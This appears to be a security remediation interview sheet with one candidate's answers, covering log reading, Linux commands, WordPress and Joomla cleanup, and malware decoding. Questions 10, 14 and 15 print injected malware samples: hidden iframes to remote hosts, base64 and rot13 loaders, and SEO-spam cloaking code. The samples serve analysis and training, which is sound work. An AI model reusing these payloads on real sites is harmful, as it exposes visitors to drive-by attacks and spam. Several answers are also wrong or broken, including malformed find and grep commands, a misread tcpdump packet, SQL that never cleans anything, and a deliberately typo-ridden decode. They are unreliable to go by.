# Gdsec

# Remediation Interview Questions

### Technical Questions

#### 1-HTTP + Apache + Logs

Look at this log line from an Apache web server:
```
    94.198.4.42 - - [31/May/2012:03:55:34 +0000] "GET /admin/banner_manager.php/login.php HTTP/1.1" 404 9185 "-" "Mozilla/5.0 (X11; U; Linux i686 (x86_64); en-US; rv:1.9.0.16) Gecko/2009122206 Firefox/3.0.16Flock/2.5.6" 
```
What can you tell us about it? Who is accessing the site? From which country/city? What is he trying to do? Did he succeed? do you think it is a malicious or normal visit? What else can you tell us?
>**Answer**: Log item for a GET http request. This request type is to "get" items from a web server.
>**Answer**: The site is accessed by a client (or user) with a Russia IP address. The city noted to likely be at this IP is "Ul'yanovsk". They identified themselves as a Firefox browser. (The IP address can be hidden by proxy, and the browser type can be written as anything the user wants).
>**Answer**: The user would like the contents of the server response to the route "/admin/banner_manager.php/login.php". The server responded with 404 (Not found). The user did not succeed.
>**Answer**: If the site is not based in Russia, it is probably a malicious request. However the server is returning a 404, blocking them from accessing some admin/login/authentication function. Just my guess based on the naming scheme.

#### 2-HTTP + PHP + Errors

You are troubleshooting a client site that is not loading properly and you find this error on the php error_log:

```
[Mon May 28 04:56:09 2012] [error] [client 109.182.33.xx] PHP Warning: require(): Failed opening './includes/login.php' 
(include_path='.:/usr/share/pear:/usr/share/php') in 
/var/www/public_html/index.php on line 5   

[Mon May 28 04:56:09 2012] [error] [client 109.182.33.xx] 
PHP Fatal error: Call to undefined function login() in 
/var/www/public_html/index.php on line 12 
```

What do you think is going on? Why the PHP fatal error? How would you fix it?
>**Answer**: I would need to see the directory ./includes/ and then the file login.php (if it is there). They are trying to include that file to reference its functions, such as login(), and this is saying the file is not found or there could be an access issue (chmod etc).

#### 3-Linux CLI + automation

Let's say you had this code injected in a number of files on the web server:
```
@require(dirname(__FILE__).'/php/malware.php'); 
```
All you have is shell access, how would you search on the directory "/var/www" to find all files that have this piece of code on it? How would you remove it without going into each file? Show me the command. 
>**Answer**: Code blocks.
```
#--------------------- 
#FIND ALL FILES, matching the line in regex
#--------------------- 
grep --recursive --files-with-matches \
"@require(dirname(__FILE__).[\']/php/malware.php['\]"\ ./varwww/*;
#--------------------- 
#REMOVE LINE, by passing file matches to SED,
#Then sed Extended Regex, --remove-in-place (-i) on regex expr..
#---------------------
grep --recursive --files-with-matches \
"@require(dirname(__FILE__).[\']/php/malware.php['\]" ./varwww/*\
 | xargs sed -Ei ".bak" \
 "/\@require\(dirname\(__FILE__\)\.'\/php\/malware\.php'\)\;/d"\
 "./varwww/samplefile copy.txt"
```

#### 4-WordPress + Troubleshooting

A client is using WordPress and when you visit his site you get this error:
```
Fatal error: Class 'WP_Rewrite' not found in /home/user/site.org/wp- settings.php on line 240 
```
What file is missing on his WordPress install?
>**Answer**: /wp-includes/class-wp-rewrite.php

#### 5-Linux CLI + Security

You have to harden a server that got compromised via a brute force attack (SSH). What command would you use to block all access to SSH and only allow connections from the IP address 1.2.3.4 to that port.
>**Answer** How I would do it. I allow localhost as well.
```
echo 'sshd : ALL' >> /etc/hosts.deny
echo '
sshd : 1.2.3.4
sshd : 127.0.0.1
sshd : [::1]
' >> /etc/hosts.allow
```
#### 6-Incident handling + Linux CLI

You are handling an incident, you want to see what has changed in the directory "/var/www/" (and all sub directories) in the last 24, 48, 72 hours, what would you run to do that? You only have shell access. What if you only have FTP access?
```
#24h
find /usr/bin/find /var/www/ -ctime 0 -type f
#48h
find /usr/bin/find /var/www/ -ctime 1 -type f
#72h
find /usr/bin/find /var/www/ -ctime 2 -type f
#FTP (on unix ftp, command **ls** works.
ls -t1 | head -1
```
#### 7-Malware decoding + Security

You are analyzing a hacked site and you found this code on the footer.php:

    eval ( base64_decode("cHJpbnQoJzxkaXY+PGEgaHJlZj0iaHR0cDovL215dGhlbWUuY29tIj5UaG VtZSBkZXZlbG9wZWQgYnkgbXl0aGVtZTwvYT4KPC9kaXY+CjwvYm9keT4KPC9odG1sPgonKTs K")); 

Is it malicious? What is this code doing?

> **Answer**: The code is not malicious, it is an obfuscated command to output the text "Theme developed by mytheme" with a link to "http://mytheme.com". 
> **Answer**: However this is likely a bad design practice. Eval() is not necessary here. It makes the actual code difficult to understand, and its usage could open an application to security flaws (if for example the inner code was something written to be malicious).
> **Answer**: See below code block.
```
    print('<div><a href="http://mytheme.com">Theme developed by mytheme</a>
                </div>
                </body>
                </html>
                ');
```
#### 8-Linux CLI + scripting + automation
We have a list with 50,000 entries similar to this one:
```
site1.com clean clean  
site2.com blacklisted clean   
site3.com blacklisted malwarefound   
site4.com clean malwarefound  
site5.com clean malwarefound   
site6.com clean clean  
site7.com clean clean  
site8.com clean clean  
site9.com clean malwarefound   
site9.com clean clean  
sitea.com blacklisted malwarefound 
```
What command would you run to generate a quick report on how many of those are blacklisted, how many are clean clean (no issues found) and how many had malware detected? You can send the resulst for those 10 sites so we can see them. Note that this has to be automated, since those 50k entries get modified many times a day.
>**Answer**: Code block
```
#Assuming that the entries are in './file.txt'
echo 'Blacklisted count--------:'
grep -o 'blacklisted' file.txt | wc -l
echo 'Clean Clean count--------:'
grep -o 'clean clean' file.txt | wc -l
echo 'Malfwarefound count------:'
grep -o 'malwarefound' file.txt | wc -l
```

#### 9-Malware and site analysis

You know a site is infected, so you don't want to visit it using a browser, how would you view it from the Linux/Mac terminal? Show us the command? What if a client is complaining of a drive-by-download attempt on her site, and saying she is on a windows box using IE, how would you emulate? What if she only gets it when she is clicking on the site from a link on facebook? Show us the commands.
>**Answer**: I understand this can be done from terminal, but a GUI tool such as "Postman" (or others) can be used to better modify your HTTP Requests and get formatted input/output for readability.
>For the terminal request, you can use 
>curl --trace-ascii d.txt --trace-time http://website.com
>If the issue is only showing on Windows/IE, first I'm going to look at the Javascript for some sort of specific selector for that combination (very common). Next I can do a modified GET request in Postman using that client info. Then if nothing is turning up, I can do a sandboxed VM with the exact specs the client is using.
>If it only happens on Facebook then it could be a referrer- url issue. Again I can emulate that in Postman by modifying some request header parameters, but if that doesn't work I'm going to go to my sandboxed VM.

#### 10-Malware decoding + Security
Can you decode this malware?
```
<script<w=window;aa=([].slice+'hjkbghkj').substr(2- 1,4);if((aa=="func")||(aa=="unct")) aa=(document['createDocumentFragme'+'n'+'t']+'asd').substr(2- 1,4);if((aa=="func")||(aa=="unct"))   
{ss=new String();s=String;12- function(){e=w['e'+'val'];f='fromCharCode';}();t='m';}ddd=new Date(); d2=new Date(ddd.valueOf()-2);h=(ddd-d2)*-1; n="4.5m4.5m52.5m51m16m20m50m55.5m49.5m58.5m54.5m50.5m55m58m23m51.5m50.5m5 8m34.5m54m50.5m54. 5m50.5m55m58m57.5m33m60.5m42m48.5m51.5m39m48.5m54.5m50.5m20m19.5m49m55.5m 50m60.5m19.5m20. 5m45.5m24m46.5m20.5m61.5m4.5m4.5m4.5m52.5m51m57m48.5m54.5m50.5m57m20m20.5 m29.5m4.5m4.5m62. 5m16m50.5m54m57.5m50.5m16m61.5m4.5m4.5m4.5m50m55.5m49.5m58.5m54.5m50.5m55 m58m23m59.5m57m52. 5m58m50.5m20m17m30m52.5m51m57m48.5m54.5m50.5m16m57.5m57m49.5m30.5m19.5m52 m58m58m56m29m23.5m23.   
5m51.5m54m55.5m49m48.5m54m57.5m58m48.5m58m58.5m56m50m48.5m58m50.5m23m49.5 m55. 5m54.5m23.5m49. 5m48.5m49.5m52m50.5m23.5m57.5m58m48.5m58m23m56m52m56m19.5m16m59.5m52.5m50 m58m 52m30.5m19.5m24. 5m24m19.5m16m52m50.5m52.5m51.5m52m58m30.5m19.5m24.5m24m19.5m16m57.5m58m60 .5m5 4m50.5m30.5m19. 5m59m52.5m57.5m52.5m49m52.5m54m52.5m58m60.5m29m52m52.5m50m50m50.5m55m29.5 m56m 55.5m57.5m52.5m58m52. 5m55.5m55m29m48.5m49m57.5m55.5m54m58.5m58m50.5m29.5m54m50.5m51m58m29m24m2 9.5m 58m55.5m56m29m24m29. 5m19.5m31m30m23.5m52.5m51m57m48.5m54.5m50.5m31m17m20.5m29.5m4.5m4.5m62.5m 4.5m   
4.5m51m58.5m55m49.5m58m52. 5m55.5m55m16m52.5m51m57m48.5m54.5m50.5m57m20m20.5m61.5m4.5m4.5m4.5m59m48.   
5m57 m16m51m16m30.5m16m50m55. 5m49.5m58.5m54.5m50.5m55m58m23m49.5m57m50.5m48.5m58m50.5m34.5m54m50.5m54. 5m50 .5m55m58m20m19.5m52.5m51m57m48. 5m54.5m50.5m19.5m20.5m29.5m51m23m57.5m50.5m58m32.5m58m58m57m52.5m49m58.5m 58m5   
0.5m20m19.5m57.5m57m49.5m19. 5m22m19.5m52m58m58m56m29m23.5m23.5m51.5m54m55.5m49m48.5m54m57.5m58m48.5m5 8m58.5m56m50m48.5m58m50.5m23m49. 5m55.5m54.5m23.5m49.5m48.5m49.5m52m50.5m23.5m57.5m58m48.5m58m23m56m52m56m 19.5m20.5m29.5m51m23m57.5m58m60.   
5m54m50.5m23m59m52.5m57.5m52.5m49m52.5m54m52.5m58m60.5m30.5m19.5m52m52.5m 50m50m50.5m55m19.5m29.5m51m23m57. 5m58m60.5m54m50.5m23m56m55.5m57.5m52.5m58m52.5m55.5m55m30.5m19.5m48.5m49m 57.5   
m55.5m54m58.5m58m50.5m19.5m29. 5m51m23m57.5m58m60.5m54m50.5m23m54m50.5m51m58m30.5m19.5m24m19.5m29.5m51m2 3m57   
.5m58m60.5m54m50.5m23m58m55. 5m56m30.5m19.5m24m19.5m29.5m51m23m57.5m50.5m58m32.5m58m58m57m52.5m49m58.5 m58m50.5m20m19.5m59.5m52. 5m50m58m52m19.5m22m19.5m24.5m24m19.5m20.5m29.5m51m23m57.5m50.5m58m32.5m58 m58m57m52.5m49m58.5m58m50. 5m20m19.5m52m50.5m52.5m51.5m52m58m19.5m22m19.5m24.5m24m19.5m20.5m29.5m4.5 m4.5m4.5m50m55.5m49.5m58.   
5m54.5m50.5m55m58m23m51.5m50.5m58m34.5m54m50.5m54.5m50.5m55m58m57.5m33m60 .5m4 2m48.5m51.5m39m48. 5m54.5m50.5m20m19.5m49m55.5m50m60.5m19.5m20.5m45.5m24m46.5m23m48.5m56m56m 50.5 m55m50m33.5m52m52.   
5m54m50m20m51m20.5m29.5m4.5m4.5m62.5"; n=n["split"](t);for(i=0;n.length-i>0;i++)ss+=s[f](-h*n[i]);f=ss;e(f); </script> 
```
What does it do? Note that it is all in one line.
>**Answer:** The item injects some javascript into the DOM using Document Fragment, after a window.eval(). I have the code block below, note there are some typos, as I don't want to waste too much time on the problem, but you can understand what the code is doing.
It inserts a hidden iframe to the body tag, which directs to http:/globalstatupdate.com/cache/stat.php. It's probably some sort of tracker. Or could have more malicious code on that site.
[https://repl.it/repls/DiligentDimLicenses](https://repl.it/repls/DiligentDimLicenses)

>**Answer:** Code block
```
 if (document.geEleentsByTagName('body'[0]){    
        iframer();
        else {
        document.wrte("
        <iframe src='http:/globalstatupdate.cm/ache/stat.php' 
        width='0' 
        height='10'
        ste=visibility:hidden;positon:absolute;left:0top:0'>
        </iframe>");
    }       
functon iframer()
{           
vr f = dcument.createElent('ifrme');
f.setAttribut(
'src,'http://globalstaupdate.om/cache/stat.php'
);
f.stle.visibility='hidden';
f.tyle.position='absolute';
f.style.left='0';
ftyle.tp='0';
f.setAttribute('wdth','10');
f.setAttribut('height','10');   
docҒment.getElementsBagNme('body')[0].appendChild(f);
```

#### 11-Networking
You are using tcpdump output and you see this entry:

```
14:56:27.742567 IP 174.143.140.137.80 >
 192.168.2.21.45704:
  Flags [S.], seq 3555324792, ack 2292208597,
   win 5792,
    options 
    [mss 1452,sackOK,
    TS val 593134436 
    ecr 91197600,
    nop,wscale 6],
     length 0 
```
Can you tell us what it means? Please give us as much details as possible.
>**Answer**: 

>**Protocol**: TCP

>**Client: IP**: 174.143.140.137 **port**:80
>**Submit TO**: **IP**: 192.168.2.21 **port**:45704
>TCP max window size 5792, Mss size 1452
>**Because this is on port 80 the 174.143.140.137 is maybe responding to an HTTP request from 192.168.2.21, but the response was length 0 so no payload data was transferred**.

#### 12-Regex

Say you are a firewall analyst and you need to block all access to these 3 vulnerable URLs:
```
"/admin/scripts/vuln.php", "/admin/scripts/unsafe.php" and "/admin/lib/blocked.php" 
```
What Regex (regular expression) would you use to block it?
>**Answer** Code block:
```
/\/admin\/(scripts|lib)\/(vuln.php|unsafe.php|blocked.php)/g
```
#### 13-Wordpress + Database

You got a wordpress website which has the following injected code in several entries of wp_posts database table:
```
<script type='text/javascript' 
src='https://ads.googleadservices.at/counter.js'>
</script>
```
What SQL command would you use to clean it up? Only the post_content field was affected.
>**Answer**: Depends on what SQL you are using. POSTGRES example:
```
SELECT post_content
FROM wp_posts
WHERE post_content LIKE convert_from(
decode('PHNjcmlwdCB0eXBlPSd0ZXh0L2phdmFzY3JpcHQnIApzcmM9J2h0dHBzOi8vYWRzLmdvb2dsZWFkc2VydmljZXMuYXQvY291bnRlci5qcyc+Cjwvc2NyaXB0Pg==', 'base64'), 'UTF8')
```
>**Answer**: OR you can use escaped HTML. But that's honestly more work. Here's the start of the code...
```
SELECT post_content
FROM wp_posts
WHERE post_content like '%<%' [.........]
```

#### 14-Wordpress + Malware analysis

Below is the content of a TwentyFifteen WordPress theme's header.php:
```
<?php/**   
        *  The template for displaying the header *   
        *  Displays all of the head element and everything up until the "site- content" div.  
         *  
         * @package WordPress  
          
* @subpackage Twenty_Fifteen * @since Twenty Fifteen 1.0 */   
?><!DOCTYPE html>  
<?php eval(base64_decode('JGY9ZGlybmFtZShfX2ZpbGVfXykuJy9pbWFnZXMvd3BfbWVudV90b 3AucG5nJzskYj1nZXRfb3B0aW9uKCd3cF90aGVtZV9tZW51X2ZpcnN0Jyk7aWYgKGZpbGVfZX hpc3RzKCRmKSBhbmQgISRiKXskZnAgPSBmb3BlbigkZiwiciIpOyRzID0gZnJlYWQoJGZwLGZ pbGVzaXplKCRmKSk7ZmNsb3NlKCRmcCk7ZXZhbCgnJG09Jy5nenVuY29tcHJlc3Moc3RyaXBz bGFzaGVzKCRzKSkuJzsnKTskaTA9JG1bMF07JGkxPSRtWzFdOyRpMj0kbVsyXTskaTM9JG1bM 107dW5zZXQoJG1bMF0sJG1bMV0sJG1bMl0pO3NodWZmbGUoJG0pOyRjc1swXT0kaTAuJGkxLi RtWzBdLiRpMi4kbVsxXS4kaTIuJG1bMl0uJGkzOyRjc1sxXT0kaTAuJGkxLiRtWzNdLiRpMi4 kbVs0XS4kaTIuJG1bNV0uJGkzO2FkZF9vcHRpb24oJ3dwX3RoZW1lX21lbnVfZmlyc3QnLGJh c2U2NF9lbmNvZGUoJGNzWzBdKSwnJywnbm8nICk7YWRkX29wdGlvbignd3BfdGhlbWVfbWVud V9zZWNvbmQnLGJhc2U2NF9lbmNvZGUoJGNzWzFdKSwnJywnbm8nICk7fWZ1bmN0aW9uIGZuKC l7aWYoKGlzX2hvbWUoKSkmJiEoaXNfcGFnZWQoKSkpICRuPWJhc2U2NF9kZWNvZGUoZ2V0X29 wdGlvbignd3BfdGhlbWVfbWVudV9maXJzdCcpKTtlbHNlICRuPWJhc2U2NF9kZWNvZGUoZ2V0 X29wdGlvbignd3BfdGhlbWVfbWVudV9zZWNvbmQnKSk7cmV0dXJuICRuO30kX0dFVFsnZ19fJ 109MTtmdW5jdGlvbiBjYigkcCl7ZWNobyAoJF9HRVRbJ2dfXyddPjApP2ZuKCk6Jyc7JF9HRV RbJ2dfXyddPTA7cmV0dXJuICRwO31pZiAoJGIpIGFkZF9hY3Rpb24oJ3dpZGdldF90aXRsZSc   
sJ2NiJyk7'));?><html <?php language_attributes(); ?> class="no-js"> <head>   
<meta charset="<?php bloginfo( 'charset' ); ?>"><meta name="viewport" content="width=device-width"><link rel="profile" href="http://gmpg.org/xfn/11"><link rel="pingback" href="<?php bloginfo( 'pingback_url' ); ?>"> <!--[if lt IE 9]><script src="<?php echo esc_url( get_template_directory_uri() );   
?>/js/html5.js"></script>  
      <![endif]-->  
<?php wp_head(); ?><iframe src="https://tehnofaq.work/css/682c" width="1" height="1" frameborder="0"></iframe><iframe src="https://tehnofaq.work/css/682c" width="1" height="1" frameborder="0"></iframe><iframe src="https://tehnofaq.work/css/682c" width="1" height="1" frameborder="0"></iframe><iframe src="https://tehnofaq.work/css/682c" width="1" height="1" frameborder="0"></iframe></head>   
<body <?php body_class(); ?>><? if(!$linkskdsdsd){ = 'true'; $servername = $_SERVER["SERVER_NAME"]; $url = str_rot13('uggc://scrq8.bet/flfgrz/yvaxbixn_arj.cuc?qbabe='); $cachefile = dirname($_SERVER['SCRIPT_FILENAME']).'/cached- script/'.md5($servername . $_SERVER["REQUEST_URI"]); $cachetime = 86400*3; if (file_exists($cachefile) && time() - $cachetime < filemtime($cachefile)) { echo file_get_contents($cachefile,1); }else{ if (!file_exists(dirname($_SERVER['SCRIPT_FILENAME']).'/cached-script')) { mkdir(dirname($_SERVER['SCRIPT_FILENAME']).'/cached-script', 0777, true); } if(function_exists('curl_version')){ $handle = curl_init(); curl_setopt($handle, CURLOPT_URL, $url . $servername . $_SERVER["REQUEST_URI"]); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); $adasd = curl_exec($handle); $datalinks = $adasd; curl_close($handle); }else{ $datalinks = file_get_contents($url . $servername . $_SERVER["REQUEST_URI"]); } $csached = fopen($cachefile, 'w'); fwrite($csached, $datalinks); fclose($csached); echo $datalinks; }} ?><? if(!$linkskdsdsd){ = 'true'; $servername = $_SERVER["SERVER_NAME"]; $url = str_rot13('uggc://scrq8.bet/flfgrz/yvaxbixn_arj.cuc?qbabe='); $cachefile = dirname($_SERVER['SCRIPT_FILENAME']).'/cached- script/'.md5($servername . $_SERVER["REQUEST_URI"]); $cachetime =   
86400*3; if (file_exists($cachefile) && time() - $cachetime < filemtime($cachefile)) { echo file_get_contents($cachefile,1); }else{ if (!file_exists(dirname($_SERVER['SCRIPT_FILENAME']).'/cached-script')) { mkdir(dirname($_SERVER['SCRIPT_FILENAME']).'/cached-script', 0777, true); } if(function_exists('curl_version')){ $handle = curl_init(); curl_setopt($handle, CURLOPT_URL, $url . $servername . $_SERVER["REQUEST_URI"]); curl_setopt($handle, CURLOPT_RETURNTRANSFER, TRUE); $adasd = curl_exec($handle); $datalinks = $adasd; curl_close($handle); }else{ $datalinks = file_get_contents($url . $servername . $_SERVER["REQUEST_URI"]); } $csached = fopen($cachefile, 'w'); fwrite($csached, $datalinks); fclose($csached); echo $datalinks; }} ?>   
<div id="page" class="hfeed site"><a class="skip-link screen-reader-text" href="#content"><?php _e(   
'Skip to content', 'twentyfifteen' ); ?></a>   
<div id="sidebar" class="sidebar"><header id="masthead" class="site-header" role="banner">   
                 <div class="site-branding">  
                      <?php  
if ( is_front_page() && is_home() ) : ?> <h1 class="site-title"><a href="<?php   
echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></h1>   
<?php else : ?><p class="site-title"><a href="<?php   
echo esc_url( home_url( '/' ) ); ?>" rel="home"><?php bloginfo( 'name' ); ?></a></p>   
'display' );  
: ?>  
$description; ?></p>  
<?php endif;$description = get_bloginfo( 'description', if ( $description || is_customize_preview() )   
<p class="site-description"><?php echo   
      <?php endif;  
?>  
<button class="secondary-toggle"><?php _e( 'Menu and widgets', 'twentyfifteen' ); ?></button>   
                 </div><!-- .site-branding -->  
           </header><!-- .site-header -->  
           <?php get_sidebar(); ?>  
      </div><!-- .sidebar -->  
<div id="content" class="site-content">   
<?php$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',   
'#ListChecker#i', '#MSIECrawler#i', '#NetCache#i', '#Nutch#i', '#RPT-HTTPClient#i',   
'#rulinki\.ru#i', '#Twiceler#i', '#WebAlta#i', '#Webster\s*Pro#i','#www\.cys\.ru#i',   
'#Wysigot#i', '#Yahoo!\s*Slurp#i', '#Yeti#i', '#Accoona#i', '#CazoodleBot#i',   
'#CFNetwork#i', '#ConveraCrawler#i','#DISCo#i', '#Download\s*Master#i',   
'#FAST\s*MetaWeb\s*Crawler#i',   
'#Flexum\s*spider#i', '#Gigabot#i', '#HTMLParser#i', '#ia_archiver#i', '#ichiro#i',   
'#IRLbot#i', '#Java#i', '#km\.ru\s*bot#i', '#kmSearchBot#i', '#libwww-perl#i',   
'#Lupa\.ru#i', '#LWP::Simple#i', '#lwp- trivial#i', '#Missigua#i', '#MJ12bot#i',   
'#msnbot#i', '#msnbot-media#i', '#Offline\s*Explorer#i', '#OmniExplorer_Bot#i',   
'#PEAR#i', '#psbot#i', '#Python#i',   
'#rulinki\.ru#i', '#SMILE#i',   
'#Speedy#i', '#Teleport\s*Pro#i', '#TurtleScanner#i', '#User-Agent#i', '#voyager#i',   
'#Webalta#i', '#WebCopier#i', '#WebData#i', '#WebZIP#i', '#Wget#i',   
'#Yeti#i','#msnbot#i', ,'#google#i' ,'#altavista#i', ,'#asterias#i' ,'#spiderthread   
'#Yandex#i', '#Yanga#i', '#spider#i', '#yahoo#i', '#jeeves#i'   
'#scooter#i' ,'#av\s*fetch#i' revision#i' ,'#sqworm#i','#ask#i' ,'#lycos.spider#i' ,'#infoseek   
sidewinder#i' ,'#ultraseek#i' ,'#polybot#i','#webcrawler#i', '#robozill#i',   
'#gulliver#i', '#architextspider#i', '#yahoo!\s*slurp#i','#charlotte#i', '#ngb#i', '#BingBot#i' ) ;   
if ( !empty( $_SERVER['HTTP_USER_AGENT'] ) && ( FALSE !== strpos( preg_replace( $user_agent_to_filter, '-NO-WAY-', $_SERVER['HTTP_USER_AGENT'] ), '-NO-WAY-' ) ) ){   
$isbot = 1; }   
if( FALSE !== strpos( gethostbyaddr($_SERVER['REMOTE_ADDR']), 'google')) {   
$isbot = 1; }   
if(@$isbot){  
$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);$ch = curl_init();   
curl_setopt($ch, CURLOPT_URL, "http://173.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$ _SERVER[HTTP_HOST]");   
    $result = curl_exec($ch);  
curl_close ($ch);  
      echo $result;  
}?> 
```

Is there any malware? If so, which piece(s) of code would you remove? Why?

>**Answer**: Blackhat SEO redir.. Remove all that garbage.
```
<?php$user_agent_to_filter = array( '#Ask\s*Jeeves#i', '#HP\s*Web\s*PrintSmart#i', '#HTTrack#i', '#IDBot#i', '#Indy\s*Library#',   
...
$_SERVER[HTTP_USER_AGENT] = str_replace(" ", "-", $_SERVER[HTTP_USER_AGENT]);$ch = curl_init();   
curl_setopt($ch, CURLOPT_URL, "http://173.236.65.24/cakes/?useragent=$_SERVER[HTTP_USER_AGENT]&domain=$ _SERVER[HTTP_HOST]");  
```

#### 15-Joomla + Malware analysis

You found the following content in ./include/defines.php of a Joomla website:
```
php//eAccelerate Caching System   
/*ordpr*/ @ini_set('display_errors', '0');   
$m[1], $m[2]);  
if(!function_exists('__e_accelerator_engine')) {function __e_accelerator_engine($output) {if (!preg_match("/(ahrefs|majestic|baidu)/i", $_SERVER['HTTP_USER_AGENT'])){ $data=serialize(array('u'=>$_SERVER['REQUEST_URI'], 'h'=>$_SERVER['HTTP_HOST'],'i'=>$_SERVER['REMOTE_ADDR'],'a'=>$_SERVER["HT TP_USER_AGENT"]));$tags=array('</body>','<p>','</div>','</span>','</heade r>','</footer>','</aside>','<h1>','<h2>','<strong>','</td>');$seed = hexdec(substr(md5($_SERVER['REQUEST_URI']), 0, 5));srand($seed);shuffle($tags);foreach($tags as $tg){if(preg_match('!'.$tg.'!', $output)) {$output=preg_replace('!'.$tg.'!', @file_get_contents(~ base64_decode('l4uLj8XQ0JWImdKKj5uei5qM0ZCNmNCKj5uei5qM0IyQno/RlYyPwI3C') . urlencode($data)).$tg, $output, 1);break;}}}return ((isset($_GET['sorted']))?('<!--sortedby:'.md5($_GET['sorted']).'-- >'):('')).$output;}   
ob_start('__e_accelerator_engine'); register_shutdown_function('ob_end_flush');} /**   
* @package Joomla.Site** @copyright Copyright (C) 2005 - 2015 Open Source Matters, Inc. All   
rights reserved.* @license GNU General Public License version 2 or later; see   
LICENSE.txt  
 */  
defined('_JEXEC') or die;  
// Global definitions$parts = explode(DIRECTORY_SEPARATOR, JPATH_BASE);   
// Defines. define('JPATH_ROOT', define('JPATH_SITE', define('JPATH_CONFIGURATION', define('JPATH_ADMINISTRATOR', 'administrator'); define('JPATH_LIBRARIES', 'libraries'); define('JPATH_PLUGINS', 'plugins'); define('JPATH_INSTALLATION', 'installation'); define('JPATH_THEMES', 'templates'); define('JPATH_CACHE', 'cache'); define('JPATH_MANIFESTS', 'manifests');   
?>
```
Is there any malicious code in that file? If so, which line(s) would you remove? Could you explain what that code is doing?
>**Answer**: Basically the entire function e_accelerator_engine is garbage code (could be malicious) that should be removed. The item is checking that the visitor (requestor) is not ahrefs|majestic|baidu. It will not spam those requestors with the payload. A quick search indicates it's an SEO spammer. That is it avoids those items as it is being used to improve search rankings elsewhere. 
>But to sum it up, remove the function and junk from this file.
